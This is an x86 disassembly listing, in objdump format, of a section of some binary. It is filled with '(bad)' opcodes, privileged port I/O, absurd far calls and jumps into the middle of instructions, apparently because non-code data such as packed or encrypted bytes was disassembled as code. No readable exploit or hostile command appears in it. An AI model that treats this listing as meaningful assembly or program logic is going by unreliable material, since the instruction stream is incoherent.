  406b15:	(bad)  
  406b16:	and    eax,0x54be5b68
  406b1b:	inc    ebp
  406b1c:	mov    DWORD PTR gs:0x87ffdc9c,esi
  406b23:	inc    ebp
  406b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b25:	push   0xffc253a4
  406b2a:	jbe    0x406b27
  406b2c:	sti    
  406b2d:	out    0xd0,eax
  406b2f:	jl     0x406b96
  406b31:	(bad)  
  406b32:	fsubr  DWORD PTR [esi+0x3]
  406b35:	out    dx,eax
	...
  406b46:	add    BYTE PTR [eax],al
  406b48:	sahf   
  406b49:	or     BYTE PTR [ebp+0x35],al
  406b4c:	mov    cl,0x6f
  406b4e:	fs jne 0x406b49
  406b51:	ja     0x406b09
  406b53:	inc    BYTE PTR [edi-0x2b]
  406b56:	fs jne 0x406b95
  406b59:	in     eax,dx
  406b5a:	out    dx,al
  406b5b:	pop    es
  406b5c:	dec    eax
  406b5d:	and    ch,BYTE PTR [eax+0x42172fff]
  406b63:	add    al,0xf0
  406b65:	call   0xf74c:0x2471ec78
  406b6c:	pop    ss
  406b6d:	lds    esi,FWORD PTR [esi+0x45]
  406b70:	or     al,0x80
  406b72:	fs jne 0x406b69
  406b75:	adc    al,0x2f
  406b77:	ins    DWORD PTR es:[edi],dx
  406b78:	leave  
  406b79:	scas   al,BYTE PTR es:[edi]
  406b7a:	add    ebp,eax
  406b7c:	pop    ebp
  406b7d:	pop    es
  406b7e:	js     0x406b84
  406b80:	lock adc DWORD PTR [ecx],ebp
  406b83:	cmc    
  406b84:	ins    BYTE PTR es:[edi],dx
  406b85:	ds call 0xa4865b8e
  406b8b:	imul   esi,eax,0x6
  406b8e:	jmp    0xf5042296
  406b93:	fs out dx,eax
  406b95:	push   es
  406b96:	jmp    0xe9302b74
  406b9b:	fnstenv [edi+0x3576e8ef]
  406ba1:	push   ebx
  406ba2:	cmp    DWORD PTR [edi+0x6d],esi
  406ba5:	push   edx
  406ba6:	fisub  WORD PTR [edi+ebx*4-0x4a]
  406baa:	int    0xee
	...
  406bbc:	add    BYTE PTR [eax],al
  406bbe:	lahf   
  406bbf:	pop    ebp
  406bc0:	cmp    al,0x68
  406bc2:	cwde   
  406bc3:	in     eax,0x57
  406bc5:	add    esi,eax
  406bc7:	adc    DWORD PTR [ecx+0x526ff4ef],ebp
  406bcd:	add    dh,al
  406bcf:	push   es
  406bd0:	adc    DWORD PTR [esi+0x18],eax
  406bd3:	enter  0x64e8,0xdd
  406bd7:	or     al,BYTE PTR [ecx-0x71a2cd87]
  406bdd:	shr    DWORD PTR [edx+0x36],cl
  406be0:	je     0x406c60
  406be2:	inc    esp
  406be3:	push   ebp
  406be4:	jle    0x406c4a
  406be6:	mov    al,ds:0x31e980b8
  406beb:	pop    ebp
  406bec:	outs   dx,BYTE PTR ds:[esi]
  406bed:	jp     0x406c5c
  406bef:	push   esi
  406bf0:	pop    esi
  406bf1:	fs das 
  406bf3:	outs   dx,BYTE PTR ds:[esi]
  406bf4:	cmp    DWORD PTR [ebp+0x3c35d27],esp
  406bfa:	mov    dh,ah
  406bfc:	push   ss
  406bfd:	ret    
  406bfe:	pop    ss
  406bff:	pop    esp
  406c00:	jl     0x406c75
  406c02:	pop    es
  406c03:	pop    ebp
  406c04:	ds fs mov ebp,0x33ffffeb
  406c0b:	pop    ebp
  406c0c:	out    0x19,eax
  406c0e:	mov    dl,0x5d
  406c10:	push   DWORD PTR [eax+0x6e]
  406c13:	arpl   di,si
  406c15:	push   ds
  406c16:	dec    esp
  406c17:	icebp  
  406c18:	inc    DWORD PTR [eax-0x16beed1f]
  406c1e:	dec    esp
  406c1f:	xchg   edx,eax
  406c20:	lock inc BYTE PTR [eax]
	...
  406c33:	add    BYTE PTR [ebx+0x5c],dl
  406c36:	push   DWORD PTR [esi+ebx*4+0x1be9412f]
  406c3d:	cdq    
  406c3e:	shr    esi,0x53
  406c41:	mov    es,WORD PTR [ebp-0xa3b42b]
  406c47:	push   ebx
  406c48:	in     al,dx
  406c49:	out    dx,al
  406c4a:	push   0xfe5cb51f
  406c4f:	xchg   esp,eax
  406c50:	cmp    al,0x54
  406c52:	inc    esi
  406c54:	adc    edx,DWORD PTR [edx]
  406c56:	ins    DWORD PTR es:[edi],dx
  406c57:	adc    BYTE PTR [ebp+0x355de75c],ch
  406c5d:	pop    esp
  406c5e:	jmp    DWORD PTR [eax+0x69]
  406c61:	outs   dx,DWORD PTR ds:[esi]
  406c62:	mul    DWORD PTR [esi+0x10fff0d3]
  406c68:	inc    edi
  406c69:	adc    al,BYTE PTR [ecx-0x17]
  406c6c:	rcl    BYTE PTR [ecx+0x5bd396f0],cl
  406c72:	(bad)  
  406c73:	mov    esp,0xe9412f40
  406c78:	fcmovnbe st,st(4)
  406c7a:	shl    BYTE PTR [esi-0x2d],0x8d
  406c7e:	test   DWORD PTR [ecx+0x74ff5b9b],ecx
  406c84:	jns    0x406cc5
  406c86:	neg    DWORD PTR [esi-0x6d]
  406c89:	mov    dh,0x67
  406c8b:	ins    BYTE PTR es:[edi],dx
  406c8c:	cli    
  406c8d:	(bad)  
  406c90:	jns    0x406ce9
  406c92:	test   DWORD PTR [eax],0x35fee7b6
	...
  406ca8:	add    BYTE PTR [eax],al
  406caa:	xor    al,0x2b
  406cac:	inc    ecx
  406cad:	add    BYTE PTR [ecx-0x39003f6d],dh
  406cb3:	or     eax,eax
  406cb5:	je     0x406ca7
  406cb7:	cmp    DWORD PTR [ebp-0x1180128],0x4
  406cbe:	jl     0x406d17
  406cc0:	(bad)  
  406cc1:	xor    BYTE PTR [esi],dh
  406cc3:	mov    ds,esp
  406cc5:	div    esi
  406cc7:	out    0x4f,eax
  406cc9:	call   0x401287
  406cce:	repnz pop esi
  406cd0:	or     al,al
  406cd2:	cmp    eax,0xade8500e
  406cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cd8:	(bad)  
  406cd9:	dec    DWORD PTR [esi-0x72]
  406cdc:	fdivr  st(7),st
  406cde:	(bad)  
  406cdf:	call   0x7c96cf8
  406ce4:	cmp    DWORD PTR [ebp-0x13f43],0xffffff99
  406ceb:	xor    esp,DWORD PTR [ebx+eax*4+0x4]
  406cef:	in     al,dx
  406cf0:	idiv   bh
  406cf2:	inc    esi
  406cf3:	pop    es
  406cf4:	je     0x406d52
  406cf6:	fisub  DWORD PTR [esi-0x17790818]
  406cfc:	push   DWORD PTR [ebx+0x1a]
  406cff:	imul   edi,edi,0xffffffff
  406d02:	(bad)  
  406d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d04:	push   DWORD PTR [ebp+0x41]
  406d07:	out    dx,eax
  406d08:	push   0xffffffba
  406d0a:	(bad)  
  406d0b:	call   0x41230e
	...
  406d20:	jne    0x406ce2
  406d22:	(bad)  
  406d23:	inc    esi
  406d25:	ds pop es
  406d27:	call   0x3fe682
  406d2c:	(bad)  
  406d2d:	jle    0x406d17
  406d2f:	div    eax
  406d31:	mov    ah,0x61
  406d33:	call   FWORD PTR [ebp+0x4ab16b65]
  406d39:	les    esp,FWORD PTR [ecx-0x1]
  406d3c:	cmp    eax,0xffff59c1
  406d41:	adc    ebx,eax
  406d43:	pop    es
  406d44:	or     BYTE PTR [eax+0x21efff9d],dl
  406d4a:	cwde   
  406d4b:	loopne 0x406d2c
  406d4d:	stc    
  406d4e:	popa   
  406d4f:	jmp    DWORD PTR [ebp+0x68]
  406d52:	imul   edx,DWORD PTR [ebp-0x9df666],0xffffff85
  406d59:	and    al,0x5a
  406d5b:	inc    edi
  406d5d:	pop    ecx
  406d5e:	xlat   BYTE PTR ds:[ebx]
  406d5f:	pop    es
  406d60:	enter  0x9d4b,0xff
  406d64:	mov    bh,0x69
  406d66:	xchg   edi,eax
  406d67:	in     al,0xa7
  406d69:	popa   
  406d6a:	popa   
  406d6b:	call   0xffa1e8f1
  406d70:	lahf   
  406d71:	jnp    0x406de3
  406d73:	not    DWORD PTR [edi+0x4d866c49]
  406d79:	inc    ecx
  406d7a:	popa   
  406d7b:	(bad)  
  406d7c:	cmp    eax,0x7fff5938
  406d81:	dec    eax
  406d82:	fnstsw WORD PTR [eax+eax*1+0x0]
	...
  406d95:	add    BYTE PTR [edi-0x57],dh
  406d98:	popa   
  406d99:	mov    ch,0x50
  406d9b:	jns    0x406dfe
  406d9d:	call   FWORD PTR [eax+0x0]
  406da0:	lahf   
  406da1:	call   FWORD PTR [edi+0x71]
  406da4:	xchg   edi,eax
  406da5:	lock pop edi
  406da7:	mov    DWORD PTR [ecx-0x18],esp
  406daa:	aad    0xc2
  406dac:	pusha  
  406dad:	inc    DWORD PTR [edi+0x23]
  406db0:	pop    esp
  406db1:	jmp    0xffa13fbd
  406db6:	aaa    
  406db7:	push   ebx
  406db8:	pop    edi
  406db9:	call   0x4b6751d
  406dbe:	lock dec edi
  406dc0:	sub    ecx,DWORD PTR [eax+esi*8]
  406dc3:	mov    bl,0x61
  406dc5:	jo     0x406e3a
  406dc7:	inc    ebx
  406dc8:	push   ecx
  406dc9:	out    dx,al
  406dca:	(bad)  
  406dcc:	icebp  
  406dcd:	pusha  
  406dce:	jge    0x406dde
  406dd0:	push   ecx
  406dd1:	fnstcw WORD PTR [ecx]
  406dd3:	pop    edx
  406dd4:	mov    ebp,DWORD PTR ss:[ebp-0x1838a3a6]
  406ddb:	mov    dh,0x90
  406ddd:	es push ds
  406ddf:	enter  0xebe8,0x0
  406de3:	adc    DWORD PTR [eax+0x7c13d703],ebp
  406de9:	sub    dh,BYTE PTR [ecx]
  406deb:	pop    es
  406dec:	adc    DWORD PTR ds:0xcfe59b0,ebx
  406df2:	mov    al,0xd2
  406df4:	fnsave [ebx+0x70e9084f]
	...
  406e0a:	add    BYTE PTR [eax],al
  406e0c:	outs   dx,BYTE PTR ds:[esi]
  406e0d:	pop    ecx
  406e0e:	pop    esp
  406e0f:	pop    esp
  406e10:	inc    eax
  406e11:	pop    edx
  406e12:	push   esp
  406e13:	or     al,0x88
  406e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e16:	mov    bh,0x60
  406e18:	xchg   edi,eax
  406e19:	outs   dx,BYTE PTR ds:[esi]
  406e1a:	loope  0x406dba
  406e1c:	(bad)  
  406e1d:	pop    ecx
  406e1e:	je     0x406de6
  406e20:	jg     0x406dd8
  406e22:	push   eax
  406e23:	sbb    dh,al
  406e25:	(bad)  
  406e26:	call   0x28514f16
  406e2b:	add    al,0x6f
  406e2d:	adc    edx,DWORD PTR [ebx+ebp*1]
  406e30:	mov    cl,0x6
  406e32:	xchg   ecx,eax
  406e33:	or     BYTE PTR [eax],dh
  406e35:	pop    ecx
  406e36:	xchg   esi,eax
  406e37:	or     al,0x30
  406e39:	shl    ch,cl
  406e3b:	mov    bl,0xd7
  406e3d:	add    al,0xe9
  406e3f:	jo     0x406dc7
  406e41:	pop    ecx
  406e42:	hlt    
  406e43:	pop    ebx
  406e44:	mov    al,ds:0xebfc0059
  406e49:	outs   dx,BYTE PTR ds:[esi]
  406e4a:	outs   dx,BYTE PTR ds:[esi]
  406e4b:	(bad)  
  406e4c:	nop
  406e4d:	pop    ecx
  406e4e:	call   0xff99f590
  406e53:	shl    DWORD PTR [edi],1
  406e55:	adc    eax,DWORD PTR [ecx-0x17]
  406e58:	nop
  406e59:	rol    DWORD PTR [edi],cl
  406e5b:	inc    ecx
  406e5c:	sub    BYTE PTR [edx-0x1],bl
  406e5f:	inc    esi
  406e60:	nop
  406e61:	sar    ebx,cl
  406e63:	ds es add eax,ebp
  406e67:	repz push ebp
  406e69:	pop    ecx
  406e6a:	jmp    DWORD PTR [eax]
  406e6c:	xor    eax,0xbc0003
	...
  406e81:	add    BYTE PTR [ebx+ebp*2-0x7f],dh
  406e85:	and    eax,0x16ff501f
  406e8a:	retw   0xb9fb
  406e8e:	push   eax
  406e8f:	ror    BYTE PTR [ebx],cl
  406e91:	push   es
  406e92:	fsubp  st(1),st
  406e94:	sub    BYTE PTR [eax+0x67fd6ef3],ch
  406e9a:	repz push es
  406e9c:	or     ebp,DWORD PTR [ecx]
  406e9e:	add    BYTE PTR [edx+0x6f3e8c1],al
  406ea4:	(bad)  
  406ea5:	and    al,0x3c
  406ea7:	pop    es
  406ea8:	add    cl,ch
  406eaa:	repz aas 
  406eac:	inc    ebp
  406ead:	aad    0x2f
  406eaf:	add    BYTE PTR [eax],al
  406eb1:	jmp    0xe9a9c74f
  406eb6:	mov    DWORD PTR [eax+0x69],ebx
  406eb9:	jmp    0x1a34311e
  406ebe:	add    DWORD PTR [edx+0x57c79ef4],0x50399e50
  406ec8:	call   FWORD PTR [eax+edx*8]
  406ecb:	outs   dx,BYTE PTR ds:[esi]
  406ecc:	iret   
  406ecd:	pop    edi
  406ece:	hlt    
  406ecf:	push   es
  406ed0:	or     eax,DWORD PTR [eax]
  406ed2:	cdq    
  406ed3:	aas    
  406ed4:	add    al,0xe9
  406ed6:	aad    0x1
  406ed8:	add    BYTE PTR [eax],al
  406eda:	icebp  
  406edb:	sbb    BYTE PTR [eax],ch
  406edd:	inc    ecx
  406ede:	sbb    DWORD PTR [ecx-0x4b3ef38c],edi
  406ee4:	mov    esi,0xff
	...
  406ef5:	add    BYTE PTR [eax],al
  406ef7:	add    BYTE PTR [esi-0x732f756e],bh
  406efd:	(bad)  
  406efe:	hlt    
  406eff:	idiv   DWORD PTR [esi-0x5eadb049]
  406f05:	in     al,0xbe
  406f07:	(bad)  
  406f08:	mov    esi,0xb6f08589
  406f0d:	mov    bh,0xfe
  406f0f:	call   0x3fe6f5
  406f14:	add    DWORD PTR [ebx],0x68
  406f17:	mov    eax,ds:0xfeff42c7
  406f1c:	xor    al,0xb3
  406f1e:	idiv   bh
  406f20:	(bad)  
  406f21:	mov    bh,0x34
  406f23:	ins    DWORD PTR es:[edi],dx
  406f24:	mov    al,ds:0xb1e7ff42
  406f29:	js     0x406f2a
  406f2b:	call   DWORD PTR [eax-0x72]
  406f2e:	in     al,0xf7
  406f30:	sahf   
  406f31:	mov    eax,0x8d410069
  406f36:	ss inc ecx
  406f38:	mov    DWORD PTR [eax-0x47490f4c],edi
  406f3e:	(bad)  
  406f3f:	jmp    esp
  406f41:	push   ebp
  406f42:	sub    BYTE PTR [ecx-0x67],al
  406f45:	jmp    0x406f60
  406f47:	mov    edi,0x8588b83e
  406f4c:	lods   eax,DWORD PTR ds:[esi]
  406f4d:	mov    al,0xfe
  406f4f:	push   DWORD PTR [ebx+0x47936802]
  406f55:	inc    edx
  406f56:	(bad)  
  406f57:	inc    ah
  406f59:	mov    bl,0xf6
  406f5b:	inc    DWORD PTR [eax]
	...
  406f6d:	add    al,dh
  406f6f:	jo     0x406fcf
  406f71:	xor    eax,0xffc446dd
  406f76:	dec    edi
  406f77:	sbb    DWORD PTR [ebp-0x7829c001],0x5dd03fe0
  406f81:	push   0xfffffff0
  406f83:	add    eax,0x6db1367c
  406f88:	pop    esi
  406f89:	mov    ch,0x20
  406f8b:	mov    al,0x5d
  406f8d:	call   DWORD PTR [edi]
  406f8f:	cli    
  406f90:	lock sub BYTE PTR [ecx+0x46de6b6d],dh
  406f97:	rcr    BYTE PTR [ebp-0x77],0x75
  406f9b:	mov    ch,0x55
  406f9d:	push   edi
  406f9f:	inc    edx
  406fa0:	add    ebp,DWORD PTR [eax-0x66]
  406fa3:	pop    esi
  406fa4:	(bad)  
  406fa5:	jmp    esi
  406fa7:	mov    bl,0x52
  406fa9:	neg    edi
  406fab:	cmc    
  406fac:	pop    ebp
  406fad:	xor    eax,0xffc44745
  406fb2:	xlat   BYTE PTR ds:[ebx]
  406fb3:	and    BYTE PTR [ebp-0x78283801],bl
  406fb9:	fadd   st(7),st
  406fbb:	push   ebp
  406fbc:	pop    ebp
  406fbd:	xor    DWORD PTR [ebp+0x4],0x56
  406fc1:	jmp    FWORD PTR [edi+0x7364d760]
  406fc7:	stos   DWORD PTR es:[edi],eax
  406fc8:	jo     0x406fc1
  406fca:	lahf   
  406fcb:	xor    eax,0xe1347404
  406fd0:	sahf   
  406fd1:	call   0x406fd6
	...
  406fe2:	add    BYTE PTR [eax],al
  406fe4:	xchg   DWORD PTR [ebp+0x5d],eax
  406fe7:	add    ah,bh
  406fe9:	lock jmp 0x406feb
  406fec:	jg     0x407033
  406fee:	sahf   
  406fef:	(bad)  
  406ff0:	std    
  406ff1:	imul   eax,DWORD PTR [bp+di],0xffffffa8
  406ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ff6:	pop    ebp
  406ff7:	call   FWORD PTR [ebp+0x5f559507]
  406ffd:	push   esi
  406ffe:	sahf   
  406fff:	xlat   BYTE PTR ds:[ebx]
  407000:	out    dx,eax
  407001:	pop    esi
  407002:	ds pushf 
  407004:	dec    edi
  407005:	push   esi
  407006:	mov    ss,WORD PTR [edi+0x5d865e58]
  40700c:	aas    
  40700d:	fdivr  st(0),st
  40700f:	imul   ebp,DWORD PTR [ecx+0x2f5d768e],0xffffff9c
  407016:	test   DWORD PTR [ebp+0x27],edx
  407019:	push   esi
  40701a:	data16 xlat BYTE PTR ds:[ebx]
  40701c:	neg    DWORD PTR [esi+0x22]
  40701f:	pushf  
  407020:	pop    ss
  407021:	push   esi
  407022:	push   esi
  407023:	xchg   edi,eax
  407024:	adc    BYTE PTR [esi+0x4e],bl
  407027:	pop    ebp
  407028:	pop    es
  407029:	fdivr  st(0),st
  40702b:	imul   ecx,ebp,0xffffff8e
  40702e:	ds pop ebp
  407030:	neg    DWORD PTR [ebx+0x55ef5515]
  407036:	xlat   BYTE PTR cs:[ebx]
  407038:	out    dx,eax
  407039:	pop    esi
  40703a:	push   es
  40703b:	pushf  
  40703c:	fist   WORD PTR [ebp+0x1e]
  40703f:	xchg   edi,eax
  407040:	int3   
  407041:	pop    ebp
  407042:	push   ss
  407043:	pop    ebp
  407044:	fcomp  DWORD PTR [edi]
  407046:	push   edx
  407047:	pop    ebp
	...
  407058:	add    BYTE PTR [eax],al
  40705a:	(bad)  
  40705b:	push   ebp
  40705c:	cmp    al,0x70
  40705e:	(bad)  
  40705f:	push   ebp
  407060:	(bad)  
  407061:	imul   edx,esi,0xffffff91
  407064:	neg    BYTE PTR [edi+ebp*4-0x65]
  407068:	add    DWORD PTR [ebp-0x59],edx
  40706b:	push   ebp
  40706c:	shl    eax,1
  40706e:	pop    edx
  40706f:	push   ebp
  407070:	ficomp WORD PTR [ebp+ebx*2+0x66]
  407074:	ficomp WORD PTR [edi+ecx*4+0x5e]
  407078:	loope  0x407012
  40707a:	xchg   DWORD PTR [ebp-0x3a],edx
  40707d:	xchg   esi,eax
  40707e:	pushf  
  40707f:	pop    ebp
  407080:	mov    esi,0x53885c
  407085:	jae    0x407053
  407087:	push   ebp
  407088:	push   DWORD PTR [ebx+eax*8+0x5d]
  40708c:	jmp    DWORD PTR [esi-0x6ef82444]
  407092:	cld    
  407093:	push   esp
  407094:	call   DWORD PTR [esi-0x690f6454]
  40709a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40709b:	push   ebp
  40709c:	call   0xff95ca2e
  4070a1:	jle    0x4070d1
  4070a3:	pop    ebp
  4070a4:	jmp    0xff963ed0
  4070a9:	outs   dx,BYTE PTR ds:[esi]
  4070aa:	ds push ecx
  4070ac:	call   0x46dfc8
  4070b1:	xor    BYTE PTR [ecx+0x78bbfffe],dh
  4070b7:	bound  eax,QWORD PTR [ebx-0x1f58db]
  4070bd:	rol    BYTE PTR [eax],cl
	...
  4070cf:	add    bh,ch
  4070d1:	push   ebp
  4070d2:	jne    0x4070c5
  4070d4:	mov    ebx,DWORD PTR [edi+esi*4+0x36]
  4070d8:	dec    esp
  4070d9:	jle    0x407120
  4070db:	sub    eax,0xa8369adb
  4070e0:	repz push ebx
  4070e2:	jne    0x4070d5
  4070e4:	dec    ebx
  4070e5:	pop    ebp
  4070e6:	std    
  4070e7:	push   ss
  4070e8:	sub    al,0x54
  4070ea:	jne    0x4070f9
  4070ec:	and    al,0xda
  4070ee:	pop    es
  4070ef:	adc    DWORD PTR [edx],edx
  4070f1:	(bad)  
  4070f2:	(bad)  
  4070f3:	(bad)  
  4070f4:	sub    DWORD PTR [ecx+0x4],ecx
  4070f7:	jmp    0x692cf262
  4070fc:	das    
  4070fd:	aaa    
  4070fe:	mul    esi
  407100:	cmp    eax,DWORD PTR [edx+0x555cdd45]
  407106:	jne    0x4070ed
  407108:	sub    bl,BYTE PTR [edx]
  40710a:	ins    DWORD PTR es:[edi],dx
  40710b:	add    BYTE PTR [ebp-0x52ff18ac],ch
  407111:	jg     0x407113
  407113:	add    BYTE PTR [edx+0x63850ec8],al
  407119:	or     al,BYTE PTR [eax]
  40711b:	add    BYTE PTR [esi+0x4900f746],cl
  407121:	or     BYTE PTR [eax],al
  407123:	(bad)  
  407124:	or     al,0xb7
  407126:	inc    BYTE PTR [edi]
  407128:	pop    ecx
  407129:	or     BYTE PTR [edx+0x0],ch
  40712c:	repz or ch,BYTE PTR [edx+0x0]
  407130:	jecxz  0x40713c
  407132:	lea    eax,[ebp+0x0]
	...
  407145:	add    BYTE PTR [ebp-0x527a7366],bh
  40714b:	mov    bh,0xfe
  40714d:	dec    DWORD PTR [ecx]
  40714f:	mov    al,0x74
  407151:	clc    
  407152:	xchg   esi,eax
  407153:	xor    eax,0x7f7fe8fb
  407158:	add    BYTE PTR [eax],al
  40715a:	adc    cl,al
  40715c:	jae    0x407163
  40715e:	mov    al,0xad
  407160:	add    BYTE PTR [eax],al
  407162:	or     DWORD PTR [eax-0x23],esp
  407165:	sub    BYTE PTR [eax+0x8],cl
  407168:	push   DWORD PTR [ebp-0x2b]
  40716b:	(bad)  
  40716d:	mov    ebp,0xd08ab016
  407172:	fs xchg ah,dh
  407175:	div    esi
  407177:	scas   eax,DWORD PTR es:[edi]
  407178:	dec    edi
  407179:	push   edx
  40717a:	icebp  
  40717b:	push   eax
  40717c:	mov    ebp,0x8581f6ff
  407181:	lock mov esi,0xc96afeb0
  407187:	pop    edi
  407188:	adc    DWORD PTR [edi],esi
  40718a:	pop    eax
  40718b:	pop    es
  40718c:	push   DWORD PTR [ebp-0x14757]
  407192:	xchg   esi,eax
  407193:	imul   BYTE PTR [ecx+ebp*1-0x38]
  407197:	or     ch,al
  407199:	and    eax,0xff5a7af0
  40719e:	jns    0x40718a
  4071a0:	pop    esi
  4071a1:	idiv   DWORD PTR [edi+0x4c]
  4071a4:	in     eax,dx
  4071a5:	dec    DWORD PTR [edi]
  4071a7:	popa   
  4071a8:	adc    al,BYTE PTR [ecx+0x0]
	...
  4071bb:	add    al,dh
  4071bd:	pushf  
  4071be:	nop
  4071bf:	lock pop edi
  4071c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071c2:	pop    edx
  4071c3:	jmp    DWORD PTR ds:0xf0412cfb
  4071c9:	jne    0x4071cd
  4071cb:	mov    ebp,0x858c7c4f
  4071d0:	push   esp
  4071d1:	jl     0x40722d
  4071d3:	dec    edx
  4071d5:	pop    ebp
  4071d6:	jmp    0x4071df
  4071d8:	call   FWORD PTR [esi]
  4071da:	add    al,0xff
  4071dc:	gs int 0x51
  4071df:	jmp    DWORD PTR [edi]
  4071e1:	in     al,0xf
  4071e3:	ins    DWORD PTR es:[edi],dx
  4071e4:	leave  
  4071e5:	sahf   
  4071e6:	add    ebp,eax
  4071e8:	or     DWORD PTR [ecx+0x5a],esi
  4071eb:	(bad)  
  4071ec:	jns    0x4071d0
  4071ee:	push   0xfffffff7
  4071f0:	pop    es
  4071f1:	(bad)  
  4071f2:	in     al,dx
  4071f3:	call   DWORD PTR [edi-0xfbeedce]
  4071f9:	adc    al,0x90
  4071fb:	lock out 0x19,eax
  4071fe:	pop    edx
  4071ff:	call   FWORD PTR ds:0xf0412c93
  407205:	test   DWORD PTR [ebp-0x44],0x858bf1d7
  40720c:	shl    cl,1
  40720e:	pop    ecx
  40720f:	push   DWORD PTR [ebp-0x15]
  407212:	idiv   DWORD PTR cs:[edi-0x1a984cf7]
  407219:	cwde   
  40721a:	(bad)  
  40721b:	jmp    FWORD PTR [esi+0xf75313]
	...
  407231:	add    BYTE PTR [edi+0xd355961],ah
  407237:	pop    es
  407238:	adc    bl,al
  40723a:	xchg   edi,eax
  40723b:	push   0xffffff91
  40723d:	cwde   
  40723e:	(bad)  
  40723f:	push   edx
  407240:	loop   0x407285
  407242:	cld    
  407243:	out    dx,eax
  407244:	imul   edx,DWORD PTR [edi+0x59c65aa4],0x58d8dbec
  40724e:	and    BYTE PTR [edx+0x525f386c],al
  407254:	scas   al,BYTE PTR es:[edi]
  407255:	mov    ah,0x57
  407257:	fcomp  QWORD PTR [edi+0x59]
  40725a:	push   edi
  40725b:	pop    esi
  40725c:	cmc    
  40725d:	or     al,0x30
  40725f:	fucomi st,st(6)
  407261:	mov    bl,0x4f
  407263:	loopne 0x4072b4
  407265:	pop    ecx
  407266:	aas    
  407267:	dec    edx
  407268:	ins    BYTE PTR es:[edi],dx
  407269:	cmp    BYTE PTR [edi],bh
  40726b:	push   edx
  40726c:	jle    0x40725d
  40726e:	das    
  40726f:	push   edx
  407270:	jmp    0x7677dffb
  407275:	pop    ecx
  407276:	pop    ds
  407277:	mov    bh,0xd0
  407279:	std    
  40727a:	faddp  st(7),st
  40727c:	call   0x5e97b7d9
  407281:	pop    ecx
  407282:	pop    es
  407283:	push   edx
  407284:	adc    al,0xe7
  407286:	enter  0xe8c7,0x6b
  40728a:	call   0x118b:0x79593e92
  407291:	push   ecx
  407292:	out    0x51,eax
  407294:	push   0xffffff97
	...
  4072a6:	add    BYTE PTR [eax],al
  4072a8:	aam    0x59
  4072aa:	es pop ecx
  4072ac:	lock add DWORD PTR [ebp+0x7d],esp
  4072b0:	lock push es
  4072b2:	jmp    0x16a2f83b
  4072b7:	pop    ecx
  4072b8:	mov    edi,0x667ff606
  4072bd:	push   es
  4072be:	jmp    0xd3e5c6
  4072c3:	add    DWORD PTR [ecx+0x52],eax
  4072c6:	(bad)  
  4072c7:	jmp    0xe9c1fdb4
  4072cc:	repz push es
  4072ce:	push   0xbe61f3f9
  4072d3:	(bad)  
  4072d4:	mov    dh,0x9
  4072d6:	call   0xff91e153
  4072db:	(bad)  
  4072dc:	data16 (bad) 
  4072de:	idiv   DWORD PTR [esi-0x1e8aae38]
  4072e4:	fld    TBYTE PTR [ebx-0x4b]
  4072e7:	scas   al,BYTE PTR es:[edi]
  4072e8:	mov    eax,0xc091b551
  4072ed:	push   ecx
  4072ee:	call   FWORD PTR [esi-0x4117f6c2]
  4072f4:	jbe    0x407347
  4072f6:	dec    DWORD PTR [esi-0x79089592]
  4072fc:	cwde   
  4072fd:	push   ecx
  4072fe:	jne    0x4072f1
  407300:	fwait
  407301:	aas    
  407302:	mov    ch,0x76
  407304:	enter  0xb551,0x8d
  407308:	rcl    BYTE PTR [ecx-0x1],0x66
	...
  40731c:	add    BYTE PTR [eax],al
  40731e:	es or  eax,ebp
  407321:	sar    BYTE PTR [esi+0x51],0xff
  407325:	push   esi
  407326:	jbe    0x40738e
  407328:	test   DWORD PTR [esi-0x68],0x8bf17551
  40732f:	mov    ds:0x84483eb5,eax
  407334:	mov    ebp,0xff504011
  407339:	jmp    0x64c360ed
  40733e:	and    ebx,DWORD PTR [eax-0x1]
  407341:	push   ds
  407342:	iret   
  407343:	fist   DWORD PTR [ecx]
  407345:	bound  eax,QWORD PTR [esi+0x2f]
  407348:	test   DWORD PTR [esi],0x305018
  40734e:	out    dx,al
  40734f:	inc    eax
  407350:	pop    es
  407351:	call   0x3ff516
  407356:	repnz add DWORD PTR [edx+0x0],ebp
  40735a:	mov    es,WORD PTR [edx+0x7]
  40735d:	call   0x3fe94e
  407362:	scas   al,BYTE PTR es:[edi]
  407363:	jbe    0x407349
  407365:	neg    DWORD PTR [esi+0x6189e7b8]
  40736b:	mov    eax,0xdef4fffe
  407370:	idiv   bh
  407372:	scas   al,BYTE PTR es:[edi]
  407373:	jecxz  0x4073f2
  407375:	mov    eax,0xb5feb89e
  40737a:	xor    eax,eax
  40737c:	(bad)  
  40737d:	inc    DWORD PTR [ecx+0xffb734]
	...
  407393:	add    BYTE PTR [esi-0x48],ch
  407396:	mov    ah,0xe0
  407398:	mov    ax,0xe8fe
  40739c:	icebp  
  40739d:	jb     0x40739e
  40739f:	jmp    FWORD PTR [esi+0x76]
  4073a2:	fdiv   st,st(7)
  4073a4:	scas   al,BYTE PTR es:[edi]
  4073a5:	mov    bh,0xe7
  4073a7:	pop    ebp
  4073a8:	loope  0x407361
  4073aa:	(bad)  
  4073ab:	jmp    esp
  4073ad:	mov    edx,0xe28efff6
  4073b2:	push   ecx
  4073b3:	mov    eax,0x45feb7ae
  4073b8:	mov    eax,ds:0xaefdd4e1
  4073bd:	mov    bh,0xfe
  4073bf:	jne    0x40736e
  4073c1:	loop   0x40735e
  4073c3:	mov    bl,cl
  4073c5:	add    ecx,ecx
  4073c7:	ret    0x3d1
  4073ca:	push   ebp
  4073cb:	mov    ebx,DWORD PTR ds:0x83fcc484
  4073d1:	add    ebp,DWORD PTR [edx+0xd]
  4073d4:	out    dx,al
  4073d5:	xor    eax,0x81f0e807
  4073da:	nop
  4073db:	(bad)  
  4073dc:	mov    edi,0x48fbc0e6
  4073e1:	add    cl,BYTE PTR [esi]
  4073e3:	inc    ecx
  4073e4:	lock push eax
  4073e6:	rol    BYTE PTR [edi],1
  4073e8:	cwde   
  4073e9:	ficom  DWORD PTR [edi-0x1]
  4073ec:	lahf   
  4073ed:	pusha  
  4073ee:	sar    bl,1
  4073f0:	xchg   edi,eax
  4073f1:	mov    dl,0xb
  4073f3:	call   0xff96ee77
	...
  407408:	add    BYTE PTR [eax],al
